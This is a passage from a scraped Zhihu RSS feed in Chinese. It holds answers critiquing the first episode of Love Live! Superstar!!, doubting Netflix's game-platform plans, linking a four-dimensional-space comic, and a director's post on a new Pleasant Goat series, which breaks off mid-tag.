data-private-watermark-src=\"v2-1f11c12d65108a3bb638251c7a9109ab\"></p>\n<p>在第一部分的最后还剩下一个问题，那便是“<b>什么是废校与废部？</b>”</p>\n<p>这一点看起来几乎没什么意义，但是作为一个干啥啥不行，就会和你掰扯来掰扯去概念的家伙，我觉得与其去抱怨为什么社团作品总是在废校、废部、找不齐人的矛盾，京吹那里搞一点“体育系社团阶级问题”都能时至今日变成ACG社区办公室政治与隐射文学的不倒素材，倒不如去想什么是。</p>\n<p>在笔者看来，废校废部这样的样板矛盾，本质上是“<b>利用一种强大而至少在矛盾初期难以被解决与解释的大而无当，或者是不需要知道有没有的外部压力，亦或是一定程度上的“他者”的凝视，来对剧情的运行去进行加速与规制</b>”。那么在这样的逻辑之下，现在的问题就变成了，这样的外部干预，究竟与LL系列中宛如世界真理一样的“<b>必然出现的对学园偶像抗拒的学生会长</b>”有着怎么样的区别了。</p>\n<p>而在我看来，这两者如果真的有什么区别，那大概便是<b>必然抗拒的学生会长</b>在LL系列中在完成了某种程度上的共情之后，便迅速地从一个本不存在的他者回归到团体内成员构建的想象界，并且进而在后续的个人部分让观众以一种错觉的认识去从一种拟态的“从想象界到实在界”的过程来获得观众对自身的投射。而不论是废校，废部，还是传统LL的lovelive大赛与绝大多数状态下的“敌团”，他们都基本上以一种他者的身份置于剧情之中，而最终LL的本体二团也确实在一系列他者的凝视之下，以一种强烈的规制及其驱力来运行。</p>\n<p>在这样的思路之下，废校废部的设计，与lovelive大赛亦或是一个遥远的目不可及的敌团来看，也没有什么明显的区别。而对比虹团初期与星团第一集中，lovelive project的宣传，广告板上隐隐约约的敌团要素，从合理推测的角度来看，纵使不再废部废校，在初期的构建中，依然具有着传统意义上管理层的科层制矛盾，在后续的发展中，依然具有着整套机制的他者凝视，其大体的方向也就八九不离十。</p>\n<p>毕竟，虹色游击队的前辈们，在第三集后相当程度上告别了这种主线剧情中的他者凝视之后给出的答案就是不断重复着一次又一次“从想象界到实在界”的拟态演出，最后用制造一个大他者（指打算开一个大聚会的计划）来完成对这种规制的回归。</p>\n<h3><b>2.当传统的中段变成开头时，能否得到足够的回应？</b></h3>\n<p>虽然上一部分从各种逻辑论证了对于改变废校废部逻辑的过度抬高的不合理，但是真的要说星团的第一集没有什么突破也确实不太对劲。</p>\n<p>在我看来，星团第一集最大的两个突破，第一个是将传统偶像作品的个人回的深层矛盾处置进行了一个激进的前置；第二个便是完成了立德与宣传机器分离。第二点与第三部分关系更紧暂且不提，先来说第一点。</p>\n<p>对照LL系列或者其他偶像动画的开篇，对于成团型偶像动画来说，初期，至少第一集的内容基本上都是既有团队的拉人+邂逅+团内人员过脸熟；而已成团的类型则也不太可能整的跟纯个人回一样似的，而也应该把第一集作为对于全团的展现与核心C位的强化。纵使是对于虹咲这种本质本格校园社团番+百合向的偶像作品，其在面对堪称本作真正主轴的侑与步梦的情感部分，本作的第一集也只是用一些迟疑和最后表层的共同意识来体现双方情感的不对等与后续的矛盾预定</p>\n<p><img src=\"https://pic3.zhimg.com/v2-60c199b712cadcfe1bfd19b05788784e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-60c199b712cadcfe1bfd19b05788784e\" data-watermark-src=\"v2-588a55f87a505f8935e49e1055e6d291\" data-private-watermark-src=\"v2-94d0d30e10fab5f8e85a8333675e0ac6\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-28b0420af5fd21888cc4e06ca54ca308_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-28b0420af5fd21888cc4e06ca54ca308\" data-watermark-src=\"v2-2229f99e3420a09b510278f9647c3a1d\" data-private-watermark-src=\"v2-c9369a4b87a46c6db6cabf8d36312fa1\"></p>\n<p>而星团的第一集，则很大程度上扎了一个马扎，狠狠地向着对个体层面的深刻矛盾的展现与解决迈了一大步，单集的开始便是团队leader香音的回忆部分，确实很出色地将香音这个角色从典型的ll系立德的超元气，精神属性超强变成了美洲杯夺冠之前各大足球论坛里面的梅西——天赋满满，人人都觉得肯定能国家队大满贯，但是大赛关键场次软脚虾，精神属性堪忧的非正常LL立德，这个是本单集的第一个亮点，很可能也是本集最让笔者有期待的地方。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6bb75bb5abc00c14c169dde94b63d41d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-6bb75bb5abc00c14c169dde94b63d41d\" data-watermark-src=\"v2-14fcbaefc69ff16f21be699438e7a02f\" data-private-watermark-src=\"v2-386caa54ff009731f08fe9c8a266e65b\"></p>\n<p>在之后切入到正式时间线里之后，一开始对于香音自己的介怀，对于躺平而绷不住的心态都也很到位，这一种将个人属性与矛盾作为剧情端口的想法我觉得很不错，即使是里面穿插了其他个人的剪影也挺合理，我真的一度感觉按照这样的突破，进一步地发扬虹咲时期对于偶像团体中个人性的调整，其实是一个挺不错比较合理的安排，既有新鲜感，又不算是没有其他类型作品的范式，但是，本作第一集迈出的这样一步也很大程度上在文本量面前扑了街。</p>\n<p>我当然能理解香音这个角色就属于是那种本质上超爱音乐，但是有一个桎梏没过过去，陷入到了的愈加自我否定与对自己精神属性怀疑的情况，到时候指不定比谁都高精神属性的角色；我也知道这种角色确实很可能是最有可能找到一个节点就突破的角色。但是本作在有虹色游击队前三集试图将重建与雪菜个人回结合，然后由于文本量没办法应对同时把重建计划中的群像面与雪菜个人部分讲好，最后把本作的第三集整成了前半程最不行的单集的前车之鉴的情况下，星团居然“百尺竿头更进一步”，直接第一集就一鼓作气就把香音这个疑似PTSD治好了，顺带着还就是唐可可说句鸡汤就走几脚就好了，啊这......</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9581b40a39295e75f54ae6705752ff25_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-9581b40a39295e75f54ae6705752ff25\" data-watermark-src=\"v2-803969dfa6960f55d6937e39223f9177\" data-private-watermark-src=\"v2-f8eb324f1e75dae2aaf6930666863d10\"></p>\n<p>于此处有着相当类似性的大概是虹团ep1里面步梦第一次入部纠结之后的台阶特效唱歌，那一段按照我昨天重新过了一遍的感觉来说，就第一集来看也是一样的仓促感，这一点印象中我在评价虹团第一集的想法时也有提到，但是当时毕竟一方面虹团的特效部分确实值得赞赏，另一方面事后诸葛亮的来看，这里只是一个分号，还没有到达爆点，存在的问题也只是犹疑而不是从小到大的PTSD级别怯场。</p>\n<p>从文本对象来看，此处解决的问题其实与爱马仕本家的雪步有着相当的相似程度，且不谈我个人觉得第一次雪步个人回的下乡演出带来的解决方法也不太行，但是人家整个单集的起承转合与几次沟通的情绪与效用，都远比现在第一集的tkk那种真空形象说几句似是而非的话来着更有感觉。而不是像现在星团这样子在第一集单薄的文本量与人物形象之下，以一种过于莫名的情绪来一股劲铆足就克服了，这很不对劲的</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e4c81c01cbf45fb2133f9efe964c3176_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-e4c81c01cbf45fb2133f9efe964c3176\" data-watermark-src=\"v2-d722fa63f4c8c4eed93237f04c3a0b9a\" data-private-watermark-src=\"v2-181f28be2ff75a58530523e88061401e\"></p>\n<p>所以从我个人的安排来说，我可能更希望把本集断在香音出门抬头听到tkk练声那里，把之前的沟通进一步扩容和增加情绪，后面再给香音纠结的部分更多篇幅与演出，然后将本集收尾的部分放在下一集中后期。同时我也希望此处的爽朗感不要就这样一下就脱胎换骨，后续不但其他地方可以多玩玩冷面帅逼要素，而且后面在什么正式一点的表演、比赛的时候建议再次因为这个出问题，然后花田大老师给一个比“不要放弃啊”更高级的回答。</p>\n<p><b>不过毕竟这都是商业企划，能骗人进llas就成功（草，千万不要这样啊！）</b></p>\n<h3><b>3.鲤鱼，此刻最大的短板，却不只是她的问题</b></h3>\n<p>不论是鲤鱼粉，鲤鱼黑亦或是摩天轮魔怔人，我们都不得不承认，鲤鱼确实很大程度上让星团的讨论热度远超其企划本身在国内的讨论热度，这一点大约大棋党，国际资本改造人会觉得意义重大，但笔者虽然键政远多于动画，但是现在只想提动画部分。</p>\n<p>从笔者的感受来说，高情商地说，鲤鱼的日语配音除去语速峰值也就只能适应动画配音这种语速，一到大喘气的时候就音色尖锐，对于国内观众来说也没有什么不适感;低情商地说，鲤鱼的中文配音水平不如其日语配音水平。第一段中文配音部分如果还能因为那种腻歪感还能因为过去传言/谣言的部分怀疑音响相关是不是把国语配音等于了台版配音，第二段的配音就能表明鲤鱼的国语配音水平确实真不行以及真没有当成台配，那种急了只是把语速加快到含糊不清，然后中文的语气词还要拖长音的说话方式，真不是国人正常说话方式。反倒是香音那一段“小笼包”居然更加字正腔圆一点。而且从LL企划下的中文直播方面，昨天鲤鱼直播的直播效果，一句话读三次的尴尬感，讲道理在我看来真不如在油管上同样日中混合直播的LLAS里面钟岚珠的CV，在广东读过几年小学的法元明菜应对自然，业务水平嘛，我就只说这么多了。</p>\n<a href=\"https://www.zhihu.com/video/1398717493972819969\">星团唐可可第二段中文配音</a><p>但是，鲤鱼的业务水平部分虽然国人肯定会更敏感，但是唐可可这个角色的微妙感，在我看来鲤鱼也就占两三成比例，就第一集来看，我觉得唐可可最大的微妙在于其定位的尴尬。上一部分我提到，星团的第二个创新就是把leader与宣传机器脱钩，而在这个过程中，确实带来了香音这样一个非典型LL核心，但是在这样的切割之下，第一集的唐可可，除去塑料日语与塑料汉语打架，就只剩下不停地和喜之郎经典广告一样重复着“我想当学园偶像”“你要不要当学园偶像”，属实让人怀疑她家是不是以前是在权健上班的。而且更微妙的问题在于，当立德与宣传者，初始的动议者进行切割之后，综使本集为唐可可安排了开导香音的部分，但是这一部分在第二部分所介绍的微妙感与极度匮乏的文本量下，就很难让我觉得这里确实能开导成功，进而更加加重了笔者对于鲤鱼/唐可可德不配位的怀疑。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9d258aec23101897a1fc870a085902f7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-9d258aec23101897a1fc870a085902f7\" data-watermark-src=\"v2-861155e8296740955b8a39b40ef6dcdf\" data-private-watermark-src=\"v2-46e24c9c1c1e7b5a23795a3fa55114c2\"></p>\n<p>如果说，唐可可这个形象除去不开口的时候还有什么时候是令我期待的，大约本集中那个唐可可日记里面那一段歌词确实是大亮点</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d17b43b0ecc0bd8ac7c02c18a9aac4b0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-d17b43b0ecc0bd8ac7c02c18a9aac4b0\" data-watermark-src=\"v2-40fbdc93b36d1ca93ee9a028813b3bcc\" data-private-watermark-src=\"v2-349b3f417a04278ce79c242b0ff2e4a8\"></p>\n<p>这一点不只是因为此处歌词确确实实比她那两段配音都要更加标准汉语，更重要的是这里让我还能抱有期待花田有可能在唐可可的中国身份上做文章，而没有彻彻底底把唐可可当成一个套模板的一般路过乐天派狂热工具人，这一点我觉得如果未来有安排唐可可的个人单回，那这里写得好是很有可能能在国内风评方面一举大提升，也是在2018年优秀表现之后花田又一次有机会逆转一下的重要部分。</p>\n<p>最后拿一点小想象来收尾这一部分，唐可可在第一集中一说“自己就是为了当学园偶像来日本的”，我的脑子里一下子想起来几年前在阿批看到的上海地铁的lovelive痛车，想到了拿上海地铁报站音剪的缪斯歌曲的鬼畜，再想了想唐可可的年龄段，或许她就是这样因为小时候在地铁站邂逅了那一班地铁而成为了LLer吧。</p>\n<p>真希望后面唐可可的剧情，能够在对于上海在ACG方面居于国内的特殊性，能够在更加充分地了解中国的前提下，真正的用好混血留学生的设定，把这个角色真正丰满成一个完整的人。</p>\n<h3><b>4.其他与总结</b></h3>\n<p>总的来说，对于本作的第一集，笔者虽然说了五千多字这些东西，看起来也不算是多好的评价，但是笔者也没有觉得第一集多么不行，甚至一定程度上因为人设与美术方面的虹色改造而感觉初见观感非常可以。</p>\n<p>我对本作有不少的担心，也基本上没想过本作能和虹团与田中仁那样能够带来许多不同于lovelive传统的新感受，但大概本作也不至于太糟糕</p>\n<p>至少这一次，“感谢”东京奥运会，喜提工期+3 weeks，大概有可能会让绘柄更稳定点，让化用卡面与游戏的灵活运用之外能够在演出上有不愧于这个企划的成果</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fc33b3a16d8bb00430bb9eaa5556310f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"1506\" data-watermark=\"original\" data-original-src=\"v2-fc33b3a16d8bb00430bb9eaa5556310f\" data-watermark-src=\"v2-f62b1d3d5d5a99bc1ad77febc9f525c1\" data-private-watermark-src=\"v2-711af401741635a9b54275a9b8f47676\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/akode-hong?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Ako的红</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/471564130/answer/1998229747?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">29 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/29681781?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《LoveLive!》有什么有意思的二设？</a><br><a href=\"http://www.zhihu.com/question/34555301?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">对于动画宅来说，Love Live! 提供了什么其他动画作品没提供的新感受？</a><br>\n","link":"http://www.zhihu.com/question/471564130/answer/1998229747?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"Netflix 将开发自主游戏平台，已聘请 Facebook 内容副总裁，有哪些行业信息值得关注？","date":"2021-07-16 03:00:08","description":"\n<p>感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/24899f12dd48bb86191ab79febb1668c\" data-hash=\"24899f12dd48bb86191ab79febb1668c\" data-hovercard=\"p$b$24899f12dd48bb86191ab79febb1668c\">@叶佳桐</a> 邀请～</p>\n<p>两个层面。</p>\n<p>（1）业务怎么样。</p>\n<p>（2）人怎么样。</p>\n<p>-</p>\n<p>先说业务。</p>\n<p><b>简单说不看好。</b></p>\n<p>不看好的理由很简单，跟我不看好头条快手谷歌FB做好游戏一样。</p>\n<p><b>主业务与【游戏内容】业务没关系。新开的游戏业务就会成为空降高管，贵价老油子老混子的混饭场所，然后会有些高薪高学历年轻人在这里混废。</b></p>\n<p>为什么，<b>因为没必要。</b> 我自有业务做得很好，转的很好，那么我的精力始终会放在我的核心业务上面。就算我自己确实有扩新业务的压力，我的惰性和有限的注意力也会限制我把这个业务做好的成都。</p>\n<p>-</p>\n<p>为了避免被叶大揍还是多写点。<b>那我们看看Netflix做游戏有什么优劣势。</b></p>\n<p>优势当然是自己做订阅制大大的牛逼，而且在内容管理，内容孵化这块仍然是世界前列，甚至是世界第一。本身企业的执行力也还是够强。</p>\n<p>劣势其实就一点，<b>没做过游戏。</b>本身这不是大问题，但现在全球范围内游戏的竞争也很激烈，这个时候加入战局，引申的问题就很多了。</p>\n<p><b>另外一个问题是Netflix需要回答自己的游戏业务到底做什么。</b></p>\n<p>我在做投资岗的时候最烦的事情就是在notes里面写跟公司的synergy。但始终，Netflix必须要回答，到底为什么我要做游戏业务。</p>\n<p>最简单的推测是，<b>【依托于强IP资源】【做订阅制平台】</b>。这两点可拆，也可以合并。</p>\n<p>如前所述，Netflix在内容管理，内容孵化这块是世界前列。他们手上有非常多的，类型极为丰富的，高质量的IP。像是《纸牌屋》，《怪奇物语》这样的电视剧IP，或是《爱尔兰人》这类电影IP（我知道这是严肃片但黑帮背景可以做的演绎很多），都是人尽皆知的。</p>\n<p>那么IP资源在手，至少可以做IP游戏。甚至在未来再做一波影游联动。至于游戏授权之类的他们已经在做了，就不提了。</p>\n<p>订阅制平台则是集中自己的订阅制侧技术优势，做一个月付或年付的游戏平台——因为Netflix这个名头还是跟订阅制联系在一起。</p>\n<p>其实这么看来风险还是存在且显著的。</p>\n<p>做IP游戏，<b>能不能搞到好的制作团队，做出好的产品是重点。</b>话又说回来，谷歌搞了Jade Raymond为首的一大批北美3A人，也没见做出什么东西来。</p>\n<p>做订阅制平台，那么你的对手是，XGP。你说XGP太大打不过，来走移动端，那也得跟Apple Arcade或者Google Play Pass打。</p>\n<p><b>恕我直言，拿头打？</b></p>\n<p>而其他游戏公司的发展方向，比如原创自研或者发行，那么Netflix都没有任何优势，失败案例很多。亚马逊12年pi都没做出来一个，或者头条这种做出一堆_____的状态。</p>\n<p><b>恕我直言，拿头做？</b></p>\n<p>当然，毕竟我是住桥洞的，上面的人高瞻远瞩，我不配评价。现在来看，Netflix把FB这哥哥找过来，应该是找到了回答。但这是不是好回答，我们不知道。</p>\n<p>我拿以上举例的四家给出的回答来给大家评价一下：</p>\n<p>头条：<i>我是国内第一渠道，肥水不流外人田。（</i>语出头条游戏某高层）</p>\n<p>快手：<i>我要做全国第一游戏内容平台。</i>（语出近期快手游戏招人po文）</p>\n<p>谷歌：<i>我要拥抱云，做领先的第一方云游戏内容。</i></p>\n<p>FB：<i>我要拥抱虚拟现实，做领先的VR/AR内容。</i></p>\n<p>结果就是，前两家至今没成（别跟我说海贼王），后两家谷歌把内容团队砍了，专注平台；FB一直没声音。</p>\n<p>Netflix能走得更好吗？非常难说。上面几家都不比Netflix缺钱缺人。</p>\n<p>-</p>\n<p>第二个问题，人怎么样。</p>\n<p>Mike Verdu当然不是无名小卒，但他也跟传统意义上的强内容型开发者关系不大。</p>\n<p>这个哥，真的，老。程序员出身，出生是在1964年。第一份可查的工作就是创业，那是在1985年。做了12年码农之后开始去做游戏。</p>\n<p>他最出名的游戏相关经历是在Zynga期间做了Farmville。但那是2009-2012年间的事情。 此外他之前在EA作为制作人和创意总监做了《命令与征服3》以及《魔戒：中土之战2》</p>\n<p>12年离开Zynga之后，Mike Verdu开始创业，做了手游公司Tapzen，拿了腾讯的钱，被Kabam收购。收购之后就一直在当职业经理人。Kabam呆了两年，充当首席创意官，然后回到了EA管手游，治下做了一堆抽卡产品，商业化最好的是IP作品《星战：银河英雄》。19年去FB，管Oculus的内容，结果其实也没有太多能说的。</p>\n<p><b>总而言之这个哥是一个老资格开发者，本身对游戏行业应该是有认知。</b></p>\n<p><b>但是近10年，Mike老哥的成绩其实乏善可陈。他这个经历和年龄，也不是很有战斗力的样子，看起来也是去Netflix爽拿美元的。</b></p>\n<p>所以不看好。</p>\n<p>如果是IP内容的话，其实周期长，风险大。这样一个人带队，失败率其实是很高的。</p>\n<p>而比较麻烦的点是从经历看这个哥没做过发行，所以要是做平台那很难说。</p>\n<p>-</p>\n<p>我觉得还是要找准自己在世界上的位置，真的。</p>\n<p>不在其位不谋其利嘛。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/472406428/answer/2000722590?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">知乎用户（登录查看详情）</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/472406428/answer/2000722590?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">15 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/21286718?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">Facebook 涉足游戏发行领域有什么优势？</a><br><a href=\"http://www.zhihu.com/question/52311919?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在facebook未成气候时，腾讯为啥不及时进军美国，腾讯比facebook成立要早啊？</a><br>\n","link":"http://www.zhihu.com/question/472406428/answer/2000722590?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何用科普动画、漫画的形式进行科学传播？","date":"2021-07-15 15:30:07","description":"\n<p>作品名：四维人看的漫画是啥样的？   作品类别：关于四维空间的脑洞   作者：ZCloud</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b0aed3b33937d1f64c4b063a03ac5e05_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"4628\" data-watermark=\"watermark\" data-original-src=\"v2-b0aed3b33937d1f64c4b063a03ac5e05\" data-watermark-src=\"v2-1150dd922e3371284864d2cf8076fae4\" data-private-watermark-src=\"v2-1206b028572a58a6777494214996b75f\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-68510626a218630199722ccdf91a1f27_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"7122\" data-watermark=\"watermark\" data-original-src=\"v2-68510626a218630199722ccdf91a1f27\" data-watermark-src=\"v2-e175470c088c2e9b7c57dc22b7195c46\" data-private-watermark-src=\"v2-2f770fe8f8001d60b651e82a32ac8161\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zcloud1985?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">ZCloud</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/472178904/answer/2000086901?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">14 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/357158336?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何引导父母一起看动画和漫画？</a><br><a href=\"http://www.zhihu.com/question/332956635?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">求推荐一些好看不火的动画或者漫画?</a><br>\n","link":"http://www.zhihu.com/question/472178904/answer/2000086901?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价7月播出的《喜羊羊与灰太狼之决战次时代》？","date":"2021-07-15 11:30:07","description":"\n<p>      大家好，我是《喜羊羊与灰太狼》总导演黄伟明。又到暑假，喜羊羊的新系列如约而至，这次推出的《决战次时代》，羊羊们将去到未来的“次时代”冒险，给大家呈现不一样的羊村和羊狼角色！感谢大家的支持与厚爱，《决战次时代》播出4天芒果TV点击率破亿，登上优酷全站热搜和少儿榜单热度第一，羊羊团队会继续努力做好内容来回馈大家的支持！</p>\n<h3><b>《喜羊羊与灰太狼》十六周年</b></h3>\n<h3><b>送给你我的一场成年礼：未来的你也可以成为自己最喜欢的样子</b></h3>\n<p>     《决战次时代》是一个和时空有关的故事，讲述了喜羊羊与灰太狼意外来到十五年后的此事后，为了重塑历史，回到自己的时空，与其他长大后的小羊们齐心收集能源石碎片，守护家园的故事.《羊村守护者》系列已经来到第四季了，什么样的题材才能不断给观众不一样的惊喜是创作团队一直在思考的事情。怎样去避免故事模式化，“突破羊守系列的传统，给观众带来点惊喜！”，于是团队一致决定，这一次跨时空之旅要做一场“成人礼”！把《决战次时代》定位在：成长与未来。小羊们一改趣萌可爱的小羊形象，加上城市化、科技化的场景元素，打开了大家对羊守系列乃至《喜羊羊与灰太狼》世界观的全新想象。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cf2e49aadb8f873dfed2cd860e7f5f2c_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-cf2e49aadb8f873dfed2cd860e7f5f2c\" data-watermark-src=\"v2-92225664d8d07e48cb4c2dece196bcba\" data-private-watermark-src=\"v2-9237c4f2e6e3dc86f1806ccfcaf0bc4a\"></p>\n<p>    为什么说是“成人礼”？今年是《喜羊羊与灰太狼》的16周年，羊狼们的形象一直深入人心，年纪虽小但却勇敢正义守护家园，一直陪伴大家的成长，大家对小羊们“多大了”这个问题也一直充满兴趣，十五年过去了，小羊们是时候长大了！因此，创作团队就决定：让大家见证一下十五年后，走上社会的小羊和大家见面，一起守护十五年后的家园。这一次无论是在动画世界里还是我们故事创作，动画制作上都是一次很大的尝试和挑战。      </p>\n<p>   比如长大后的小羊形象，在创作初期，我们构想设计过许多小羊长大后形象，那究竟怎样才符合长大后的他们呢？才能做出合理的变化？<b>在我看来，作为家喻户晓的国民动画IP，我们角色形象的突破要建立在角色固有的DNA上，不能纯粹为了“博眼球”而变。一方面要有新鲜度和惊喜感，另一方面也要保持角色积累十五年来的原始设定。</b>在几番讨论过后，我们决定以梦想和职业为切入点：从“大肥羊学校”到进入“次时代社会”这必然是一个飞越的改变，有了职业身份的变化就能合理化地去塑造新的形象。而职业的设定我们也是顺延他们小时候的想法，从它们从小的品格特点延展和发挥开来的，比如暖羊羊当上了形象转变十分大的歌星是因为她喜欢唱歌，喜欢歌星扁嘴伦，一直想成为勇敢自信的自己，所以从默默付出到登上舞台，自信健康的暖羊羊成为了本次角色形象中改变最大的一只羊。   </p>\n<p><img src=\"https://pic1.zhimg.com/v2-b43145848f14497ed10d9cecffde0bbb_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b43145848f14497ed10d9cecffde0bbb\" data-watermark-src=\"v2-978be4e58259a1f45385cb25ac92661c\" data-private-watermark-src=\"v2-d4f4c0c05dd976da17468475aa29bf5a\"></p>\n<p>    同时，我觉得童年的梦是美好的，也是最难以坚持的，所以我们还想借小羊们长大后实现梦想来让大家知道：心中的种子可以发芽开花结果，你也可以成为你自己喜欢的样子。只要努力追求，坚持热爱，梦想成真，理想实现并不只是童话而已！所以，<b>我觉得长大后的他们应该是他们从小向往，努力奔赴的样子，是观众们一直期盼的样子。  </b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e9e25949d3d86f9f26f4d3b70824c827_720w.jpeg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e9e25949d3d86f9f26f4d3b70824c827\" data-watermark-src=\"v2-14961783441e0b7f76605e60cd4ee7e9\" data-private-watermark-src=\"v2-d8334910ac80bfc8dab39a09ef48235b\"></p>\n<h3><b>适当的留白，让角色的未来充满无限可能</b></h3>\n<p>     我看到有些观众在问：为什么没有设定喜羊羊长大呢？喜羊羊的成长有些许不同的，他有经历过不同时期，性格也有发生不同的转变，比起其他小羊，喜羊羊更加多面，因此每个人心里留下的，喜欢的喜羊羊都是不一样的，也许有人认为他调皮淘气可爱，认为他成熟懂事，未来他会上太空还是留在草原守护家园，大家对他的期望和想象都很广很大，<b>所以我们并不想就此框定了所有羊狼，在塑造角色的过程中给观众留下一个空白，</b>借用主角视角来开启这一场时代之旅，让大家代入到喜羊羊的角色去看其他同伴的成长变化，然后<b>去想象未来的自己</b>。这一次时代之旅过后，相信大家心里也有了自己的“次时代喜羊羊”了吧？喜羊羊也会有属于他的光明未来，至于长大后的他会是什么样呢？就留给大家想象啦！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9540ba08f3c33e58241019ac0b25b592_720w.gif?rss\" data-rawwidth=\"717\" data-rawheight=\"420\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-9540ba08f3c33e58241019ac0b25b592\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3><b>与角色一同呼吸一同成长，在细节中挖掘故事深度</b></h3>\n<p>     从《决战次时代》首播到现在，大家最关切的一看点莫过于灰太狼和小灰灰的亲情羁绊，也是我们着力刻画的情感点，过程中也有过担心忧虑：昔日亲情浓厚的狼堡父子变得冷漠仇恨是否会让观众不习惯？但矛盾和失去是我们成长过程中必经阶段，经得起风雨的感情才令人倍感珍惜，将更加浓烈。实际上，小灰灰也并不是真正讨厌，不在意灰太狼，只是太爱爸爸而无法接受他离去的十五年，在沟通，互吐心声后的两父子就释怀了，从而一同并肩作战守护家园。希望通过故事传达出珍惜当下，父母们和孩子之间更多陪伴与沟通，关注孩子的成长，培养孩子优良的品质，父母和孩子一起进步。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-eabce0cf9f590bb49386feed50d039fe_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" 